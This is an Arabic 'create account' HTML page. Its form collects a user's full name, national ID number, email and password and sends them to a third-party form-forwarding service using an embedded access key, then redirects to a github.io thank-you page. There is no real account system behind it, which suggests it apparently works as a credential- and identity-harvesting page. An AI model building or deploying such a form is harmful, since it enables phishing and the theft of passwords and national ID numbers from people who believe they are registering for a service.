<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>إنشاء حساب</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
  <style type="text/css">
    * { box-sizing: border-box; }
    body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
    
    .form-container {
      margin: 20px auto;
      max-width: 450px;
      padding: 15px;
      background: #173459;
      color: white;
      border-radius: 10px;
      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.3);
    }

    .input-cnt { display: flex; margin-bottom: 15px; }

    .input-cnt > i {
      min-width: 50px;
      padding: 10px;
      text-align: center;
      background: lightgrey;
      /* تصحيح: الزوايا المنحنية يجب أن تكون جهة اليمين لأننا نستخدم RTL */
      border-top-right-radius: 20px;
      border-bottom-right-radius: 20px;
      color: #0076ff;
    }

    .input-cnt > input {
      outline: none;
      border: none;
      padding: 10px;
      border: 1px solid lightgrey;
      /* تصحيح: الزوايا المنحنية جهة اليسار لتتصل بالأيقونة */
      border-top-left-radius: 20px;
      border-bottom-left-radius: 20px;
      width: 100%;
    }

    /* تنسيق زر تقديم الطلب */
    .submit-btn {
      border: none;
      border-radius: 20px;
      width: 100%;
      padding: 12px;
      color: #0076ff;
      background: white;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <h2 style="text-align: center; color: #173459;"> إنشاء حساب </h2>
  <div class="form-container">

    <form action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data">

      <input type="hidden" name="access_key" value="bb611f86-0aaf-4725-9876-4f82fbe0689e">

      <input type="hidden" name="redirect" value="https://twhyb2023.github.io/thanks.html">

      <div class="input-cnt">
        <i class="material-icons">person</i>
        <input type="text" placeholder="إسمك بالكامل" name="name" required />
      </div>

      <div class="input-cnt">
        <i class="material-icons">fingerprint</i>
        <input type="text" placeholder="رقم الهوية ID" name="username" required />
      </div>

      <div class="input-cnt">
        <i class="material-icons">email</i>
        <input type="email" placeholder="البريد الإلكتروني" name="email" required />
      </div>

      <div class="input-cnt">
        <i class="material-icons">lock</i>
        <input type="password" placeholder="كلمة المرور" name="password" required />
      </div>

      <div class="input-cnt" style="margin-top: 20px;">
        <input type="submit" class="submit-btn" value="تقديم طلب" />
      </div>

    </form>
  </div>
</body>
</html>
